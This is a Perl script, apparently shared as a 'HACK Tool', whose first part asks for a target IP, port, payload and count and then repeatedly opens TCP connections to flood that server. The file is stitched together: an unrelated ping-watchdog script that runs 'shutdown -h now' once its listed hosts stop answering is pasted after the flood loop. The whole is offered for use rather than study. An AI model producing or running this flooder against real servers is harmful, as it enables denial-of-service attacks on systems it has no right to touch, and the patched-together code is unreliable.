#!/usr/bin/perl
use IO::Socket;
print q{
 __________  ____  _____
|____  ____|/ ___||  _  |
    |  |   / /    |   __|
    |  |  (  \___ |  |
    |__|   \_____||__|
 _________  __                     _
\_   _____/|  |   ____   ____   __| |
 |    __)  |  |  /  _ \ /  _ \ / __ |
 |   |     |  |_(  <_> |  <_> ) /_/ |
 \___|     |____/\____/ \____/\_____|
                

Made By "NonameCyber13" HACK Tool

Flooding!!!
Fucking Flood
TCP Floob

};


print "IP : ";
$serv = <stdin>;
chop ($serv);

print "Port : ";
$port = <stdin>;
chop ($port);

print "Data :";
$data = <stdin>;
chop($data);

print "Times To Flood : ";
$times = <stdin>;
chop ($times);


for ($i=0; $i<$times; $i++)
{
$flood = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "$port") || print "[*] Server Down!\n";
print $flood $data;
syswrite STDOUT, "[*] Flooding - ".$i."\n";
}

use Net::Ping;
use Getopt::Std;
  
 my $command = "shutdown -h now";
 my $sleep_time = 300;
 my $timeout = 10;
 my $hosts = ();
 
 my %options = ();
 getopt "cst", \%options;
 $command = @options{c} if defined @options{c};
 $sleep_time = @options{s} if defined @options{s};
 $timeout = @options{t} if defined @options{t};
 @hosts = @ARGV;
  
if (scalar @hosts < 1) {
     print "Usage: $0 [options] list-of-ips\n";
     print "\t-c\tcommand to run\n";
     print "\t-s\tsleep time between pinging (in seconds)\n";
     print "\t-t\tping timeout (in seconds)\n";
     exit -1;
 }
  
  $ping = Net::Ping->new("tcp", $timeout);
  
  my $again;
 do {
     $again = 0;
     # Wait some time before checking 
     sleep $sleep_time;
     # Ping machines 
     foreach (@hosts) {
         my $present = $ping->ping($_);
         $again |= $present;
     }
 } while ($again);
  
 $ping->close();
  
 # Info 
 print "$0: dead hosts: @hosts\n";
 print "$0: running command '$command'\n";
  
 # Run command 
 system $command;
 
print "[*] End of flood.\n";